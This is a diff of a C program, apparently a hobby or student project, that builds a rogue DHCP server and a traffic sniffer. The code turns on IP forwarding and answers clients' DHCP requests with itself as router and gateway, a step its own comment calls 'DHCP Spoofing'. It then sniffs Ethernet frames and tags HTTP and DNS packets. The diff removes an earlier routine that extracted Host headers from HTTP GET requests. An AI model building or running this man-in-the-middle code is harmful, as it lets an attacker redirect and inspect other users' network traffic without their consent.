@@ -6,6 +6,7 @@
 #include <stdlib.h>
 #include <net/if.h>
 #include <net/if_arp.h>
+#include <net/ethernet.h>
 #include <netinet/if_ether.h>
 #include <arpa/inet.h>
 #include <netinet/in.h>
@@ -14,64 +15,46 @@
 #include <sys/types.h>
 #include <ifaddrs.h>
 #include <netinet/tcp.h>
+#include <netinet/udp.h>
 #include <netinet/ip.h>
+#include <dns_util.h>
 #include <pthread.h>
 #include <sys/ioctl.h>
 #include <resolv.h>
 
 #include "dhcp.h"
+#include "util.h"
+#include "ippool.h"
+#include "ethernet.h"
 
-/// A flag to indicate wheter debug printing should be performed
-int verbose_mode = 0;
 char ifa_name[IFNAMSIZ + 1];
+
 struct in_addr my_ip;
 struct in_addr brd_addr;
 struct in_addr sub_addr;
 struct in_addr dns_addr;
-uint8_t srv_hst_name[] = "NOT-A-ROUTER";
-uint8_t dns_srv_addr[] = "8.8.8.8"; // Google Public DNS Server will be used as it's always avaiable
+char srv_hst_name[] = "NOT-A-ROUTER";
+char dns_srv_addr[] = "8.8.8.8"; // Google Public DNS Server will be used as it's always avaiable
 uint8_t cur_ip = 40;
 
-/// Always use this print, which is only enabled when verbose mode is enabled.
-void d_printf(char* format, ...) {
-	va_list arguments;
-	if( !verbose_mode ) {
-		return;	
-	}
-	va_start(arguments, format);
-	vprintf(format, arguments);
-	va_end(arguments);
-}
+// Transport Layer protocol numbers
+#define TCP_PROT 0x6
+#define UDP_PROT 0x11
 
-/// Gets the initial flags from the Command Line
-void get_initial_flags(int argc, char** argv) {
-	int value = 0;
-	// Loop to look for flags
-	while( (value = getopt(argc, argv, "v")) != -1 ) {
-		switch( value ) {
-			case 'v':
-				verbose_mode = 1;
-				break;
-			case '?':
-				
-				break;
-			default:
-				break;
-		}	
-	}
-}
-
+// Application Layer port numbers
+#define HTTP_PORT 80
+#define DNS_PORT 53
 
 /// Returns the next ip for the network
 in_addr_t get_cur_ip() {
 	return ( my_ip.s_addr & sub_addr.s_addr ) + cur_ip;
 }
 
-/// Alloc & Initialze objects. 
+/// Alloc & Initialze objects.
 /// Perform Initial Setup of the program
 void init(void) {
 	d_printf("Initializing\n");
-		
+
 	// Enabling Ip-Forwarding
 	#ifdef __linux__
 		system("echo 1 > /proc/sys/net/ipv4/ip_forward");
@@ -85,7 +68,7 @@ void init(void) {
 	it = addrs;
 	memset(ifa_name, 0, IFNAMSIZ + 1);
 	while(it) {
-		if( it->ifa_addr && it->ifa_addr->sa_family == AF_INET && strcmp(it->ifa_name, "lo") != 0 ) {
+		if( it->ifa_addr && it->ifa_addr->sa_family == AF_INET && strstr(it->ifa_name, "lo") == 0 ) {
 			struct sockaddr_in *sock_addr = (struct sockaddr_in *)it->ifa_addr;
 			struct sockaddr_in *sock_brd_addr = (struct sockaddr_in *)it->ifa_broadaddr;
 			struct sockaddr_in *sock_sub_addr = (struct sockaddr_in *)it->ifa_netmask;
@@ -102,25 +85,29 @@ void init(void) {
 		it = it->ifa_next;
 	}
 	freeifaddrs(addrs);
-	
+
 	// Initialization to get DNS Server Ip
 	dns_addr.s_addr = inet_addr(dns_srv_addr);
 	d_printf("DNS Server Ip: %s\n", inet_ntoa(dns_addr));
+
+	// Initialization of the Custom Ethernet
+	d_printf("Ethernet Initialization\n");
+	eth_init();
 
 	d_printf("Done - Initialization\n");
 }
 
 /// Dealloc objects
 /// Perform deinitialization for the objects
-void deinit(void) {	
+void deinit(void) {
 	d_printf("Deinitializing\n");
 }
 
 /// This should perform the DHCP Spoofing
-void init_DHCP_server(void* arg) {
-	
+void* init_DHCP_server(void* arg) {
+
 	d_printf("DHCP Init\n");
-	
+
 	dhcp_hdr i_hdr, o_hdr;
 	dhcp_opt i_opt, o_opt;
 	in_addr_t i_addr;
@@ -130,16 +117,15 @@ void init_DHCP_server(void* arg) {
 		memset(&i_opt, 0, sizeof(i_opt));
 		memset(&o_hdr, 0, sizeof(o_hdr));
 		memset(&o_opt, 0, sizeof(o_opt));
-		
+
 		d_printf("Waiting DHCP Packages\n");
-	
+
 		// Gets a dhcp package from the network
 		i_addr = wait_dhcp_hdr(&i_hdr);
-		
+
 		// Get Options from Header
 		set_dhcp_opt_from_dhcp_hdr(&i_opt, &i_hdr);
 
-		
 		d_printf("i_addr = %d\n", i_addr);
 		switch(i_opt.dhcp_msg) {
 			case DISCOVER:
@@ -148,18 +134,18 @@ void init_DHCP_server(void* arg) {
 				o_hdr.opcode = 0x2; 		// Reply
 				o_hdr.hrd_t = 1; 		// Ethernet
 				o_hdr.hrd_addr_l = ETHER_ADDR_L;// 6 Bytes
-				o_hdr.hop_c = 0;		
+				o_hdr.hop_c = 0;
 				o_hdr.trs_id = i_hdr.trs_id;	// Transactio ID from the captured package
-				o_hdr.num_s = 0;		
+				o_hdr.num_s = 0;
 				o_hdr.flags = i_hdr.flags;	// Flags from the client
-				o_hdr.clt_ip = 0;		
-				o_hdr.own_ip = inet_addr("10.32.143.40"); // Static Value for Now
+				o_hdr.clt_ip = 0;
+				o_hdr.own_ip = inet_addr("192.168.0.40"); // Static Value for Now
 				o_hdr.srv_ip = my_ip.s_addr;
 				o_hdr.gtw_ip = my_ip.s_addr;
 				memcpy(o_hdr.clt_hrd_addr, i_hdr.clt_hrd_addr, CLT_HRD_ADDR_L);
 				memcpy(o_hdr.srv_hst, srv_hst_name, strlen(srv_hst_name));
 				memcpy(o_hdr.boot_fln, i_hdr.boot_fln, BOOT_FLN_L);
-				
+
 				// Options
 				o_opt.dhcp_msg = OFFER;
 				o_opt.ip_lease_time = 10000;
@@ -172,11 +158,15 @@ void init_DHCP_server(void* arg) {
 
 				// Sets the flags for the header
 				set_dhcp_hdr_from_dhcp_opt(&o_opt, &o_hdr);
-			
+
 				// Sends the package
 				send_dhcp_hdr(&o_hdr, INADDR_BROADCAST);
-				
+
+				// Sets the transaction id for the ip
+				set_ip_for_trs_id(get_cur_ip(), i_hdr.trs_id);
+
 				d_printf("Host Name: %s\n",i_opt.hst_name);
+				d_printf("His Ip: %u\n", get_cur_ip());
 				break;
 			case OFFER:
 				d_printf("Offer\n");
@@ -191,15 +181,15 @@ void init_DHCP_server(void* arg) {
 				o_hdr.num_s = 0;
 				o_hdr.flags = i_hdr.flags;	// Flags from the client
 				o_hdr.clt_ip = i_hdr.clt_ip;
-				o_hdr.own_ip = inet_addr("10.32.143.40");
+				o_hdr.own_ip = inet_addr("192.168.0.40");
 				o_hdr.srv_ip = my_ip.s_addr;
 				o_hdr.gtw_ip = my_ip.s_addr;
 				memcpy(o_hdr.clt_hrd_addr, i_hdr.clt_hrd_addr, CLT_HRD_ADDR_L);
 				memcpy(o_hdr.srv_hst, srv_hst_name, strlen(srv_hst_name));
 				memcpy(o_hdr.boot_fln, i_hdr.boot_fln, BOOT_FLN_L);
-	
+
 				// Options
-				o_opt.dhcp_msg = ACK;		
+				o_opt.dhcp_msg = ACK;
 				o_opt.ip_lease_time = 10000;
 				memcpy(o_opt.srv_id, &my_ip.s_addr, IP_ADDR_L);
 				memcpy(o_opt.rtr_id, o_opt.srv_id, IP_ADDR_L);
@@ -210,10 +200,16 @@ void init_DHCP_server(void* arg) {
 
 				// Gather the flags from the header
 				set_dhcp_hdr_from_dhcp_opt(&o_opt, &o_hdr);
-				
+
 				// Sends the package
 				send_dhcp_hdr(&o_hdr, INADDR_BROADCAST);
-				
+
+				// Sets the transaction id for the ip
+				set_ip_for_trs_id(get_cur_ip(), i_hdr.trs_id);
+
+				d_printf("Host Name: %s\n",i_opt.hst_name);
+				d_printf("His Ip: %u\n", get_cur_ip());
+
 				cur_ip++;
 				d_printf("Request\n");
 				break;
@@ -237,135 +233,55 @@ void init_DHCP_server(void* arg) {
 				break;
 		}
 	}
-
-}
-
-void print_payload(unsigned char* data, int Size) {
-int i,j;
-     
-    for(i=0 ; i < Size ; i++)
-    {
-        if( i!=0 && i%16==0)   //if one line of hex printing is complete...
-        {
-            printf("         ");
-            for(j=i-16 ; j<i ; j++)
-            {
-                if(data[j]>=32 && data[j]<=128)
-                    printf("%c",(unsigned char)data[j]); //if its a number or alphabet
-                 
-                else printf("."); //otherwise print a dot
-            }
-            printf("\n");
-        } 
-         
-        if(i%16==0) printf("   ");
-            printf(" %02X",(unsigned int)data[i]);
-                 
-        if( i==Size-1)  //print the last spaces
-        {
-            for(j=0;j<15-i%16;j++) printf("   "); //extra spaces
-             
-            printf("         ");
-             
-            for(j=i-i%16 ; j<=i ; j++)
-            {
-                if(data[j]>=32 && data[j]<=128) printf("%c",(unsigned char)data[j]);
-                else printf(".");
-            }
-            printf("\n");
-        }
-    }
-}
-
-int handle_ok(char *buffer, char **ip, char **host) {
-	unsigned char *get;
-	unsigned char *var;
-	if ((get = strstr(buffer, "HTTP/1.1 200 OK")) != NULL) {
-		char *token = NULL;
-
-		token = strtok(get, "\n");
-		int i;
-		for (i=0; i<20 && token; i++) {
-			if ((var = strstr(token, "text/html")) != NULL) {
-				return 1;
-			}
-			token = strtok(NULL, "\n");
-		}
-	}
-	return 0;
-}
-
-int handle_http(char *buffer, char **ip, char **host) {
-	unsigned char *get;
-	unsigned char *var;
-	if ((get = strstr(buffer, "GET")) != NULL) {
-		char *token = NULL;
-
-		token = strtok(get, "\n");
-		int i;
-		for (i=0; i<2 && token; i++) {
-			if ((var = strstr(token, "Host")) != NULL) {
-				*host = var+6;
-				return 1;
-			}
-			token = strtok(NULL, "\n");
-		}
-	}
-	return 0;
-}
-
-//Wait for incoming HTTP packets
-int wait_packet(int sock_raw, char **host, char **ipx, int op) {
-	unsigned char *buffer = (unsigned char *)malloc(65536);
-	int data_size;
-	d_printf("wait_http_packet\n");
-	char *ip;
-	//struct sockaddr saddr;
-	//int saddr_size = sizeof(saddr);
-	
-	memset(buffer, 0, sizeof(*buffer));
-
-    	struct iphdr *iph;
-	struct tcphdr *tcph;
-	struct sockaddr_in source;
-
-	do {
-		//Receive a packet
-		d_printf("waiting a packet...\n");
-		data_size = recvfrom(sock_raw, buffer, 65536, 0, NULL, NULL);//&saddr, &saddr_size);
-		d_printf("received\n");
-		if (data_size < 0) {
-			//Return in an error occur
-			perror("recvfrom");
-			return 0;
-		}
-
-		iph  = (struct iphdr*) (buffer + sizeof(struct ethhdr));
-		tcph = (struct tcphdr*)(buffer + sizeof(struct ethhdr) + sizeof(struct iphdr));
-		memset(&source, 0, sizeof(source));
-		source.sin_addr.s_addr = iph->saddr;
-
-		if (iph->protocol == 6 && tcph->doff > 0) {
-			buffer += sizeof(struct ethhdr)+sizeof(struct tcphdr)+sizeof(struct iphdr);
-			ip = inet_ntoa(source.sin_addr);
-			if (op==0) {
-				*ipx = ip;
-				return handle_http(buffer, ip, host);
-			} else if (op==1) {
-				if (strcmp(*ipx, ip) == 0)
-					return handle_ok(buffer, ip, host);
-				return 0;
-			}
-
-		}
-
-
-	} while(1);
+	return NULL;
 }
 
 //Monitor the HTTP network traffic
 void init_sniffer() {
-	int sock_raw;
+
+	d_printf("Initializing Sniffer\n");
+	// Begin listening for Ethernet Frames
+	d_printf("Ethernet Payload Length: %u\n", ETHER_MAX_LEN - ETHER_HDR_LEN);
+	eth_frm *frame = calloc(sizeof(struct ether_header) + ETHER_MAX_LEN - ETHER_HDR_LEN, 1);
+	for(;;) {
+
+		size_t read_bytes = wait_eth_frame(&frame);
+		d_printf("%lu bytes\n", read_bytes);
+		d_printf("[Ethernet");
+		if( ntohs(frame->hdr.ether_type) == ETHERTYPE_IP ) {
+				struct ip *iphdr = (struct ip*)frame->payload;
+				d_printf("-Ip");
+				if( iphdr->ip_p == TCP_PROT ) {
+					struct tcphdr* tcp = (struct tcphdr*)(frame->payload + sizeof(struct ip));
+					d_printf("-TCP");
+					d_printf("(s:%u, d:%u)", ntohs(tcp->th_sport), ntohs(tcp->th_dport));
+					if( ntohs(tcp->th_dport) == HTTP_PORT ) {
+							d_printf("-HTTP");
+					}else{
+						d_printf("-*");
+					}
+				}else if( iphdr->ip_p == UDP_PROT  ) {
+					struct udphdr* udp = (struct udphdr*)(frame->payload + sizeof(struct ip));
+					d_printf("-UDP");
+					d_printf("(s:%u, d:%u)", ntohs(udp->uh_sport), ntohs(udp->uh_dport));
+					if( ntohs(udp->uh_dport) == DNS_PORT ) {
+						dns_header_t* dns = (dns_header_t*)(frame->payload + sizeof(struct ip) + sizeof(struct udphdr));
+						d_printf("-DNS");
+						d_printf("-%s", (ntohs(dns->flags) & 0x8000) == 0 ? "Query" : "Response");
+						//d_printf("(n:%x, qc: %x, ac: %u)", ntohs(dns->xid), ntohs(dns->qdcount), ntohs(dns->ancount));
+					}else{
+						d_printf("-*");
+					}
+				}else{
+					d_printf("-*");
+				}
+		}else{
+			d_printf("-*");
+		}
+		d_printf("]\n");
+	}
+}
+	/*int sock_raw;
 	struct ifreq interfaceFlags;
 
 	//Create a raw socket that shall sniff
@@ -400,10 +316,9 @@ void init_sniffer() {
 		}
 	}
 
-	close(sock_raw);
-}
+	close(sock_raw);*/
 
-int main(int argc, char** argv) {		
+int main(int argc, char** argv) {
 	// Gets Initial Flags
 	get_initial_flags(argc, argv);
 
@@ -411,15 +326,15 @@ int main(int argc, char** argv) {
 	init();
 
 	// Register exit function
-	atexit(deinit);	
-	
+	atexit(deinit);
+
 	pthread_t thread;
 
-	//if( pthread_create(&thread, NULL, &init_DHCP_server, NULL) != 0 ) {
-	//	d_printf("Deu Merda\n");
-	//}
-	
-	
+	/*if( pthread_create(&thread, NULL, &init_DHCP_server, NULL) != 0 ) {
+		d_printf("pthread_create(DHCP)\n");
+	}*/
+
+
 	init_sniffer();
 
 	// End of program
